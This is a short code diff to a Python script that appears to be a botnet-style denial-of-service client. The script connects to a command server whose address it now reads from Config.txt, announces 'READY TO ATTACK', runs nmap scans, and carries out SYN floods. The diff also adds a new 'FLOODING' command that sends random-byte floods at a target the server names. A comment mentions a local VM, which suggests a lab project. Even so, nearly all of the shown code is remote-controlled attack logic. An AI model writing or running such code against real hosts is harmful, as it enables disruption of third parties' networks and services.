@@ -37,7 +37,16 @@ def randombyteflooding(TARGET):
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-s.connect(('192.168.56.101',11111)) #Reference to local server VM
+HOST_SERVER = ' '
+
+with open("Config.txt", 'r') as file:
+	content = file.readlines()
+	lines = content[1]
+	HOST_SERVER = lines[13:]
+
+print('HOST_SERVER = ', HOST_SERVER)
+
+s.connect((HOST_SERVER,11111)) #Reference to local server VM
 
 STATUS = 'READY TO ATTACK'
 
@@ -62,6 +71,9 @@ while True:
 				synflood(parseddata[3],getopenports[index])
 			with open("log.txt", 'a') as f:
 				f.write(str(nm[parseddata[3]].all_tcp()))
+
+	if parseddata[0] == "FLOODING":
+		randombyteflooding(parseddata[1])
 
 			#s.send(str(nm.scaninfo()))
 
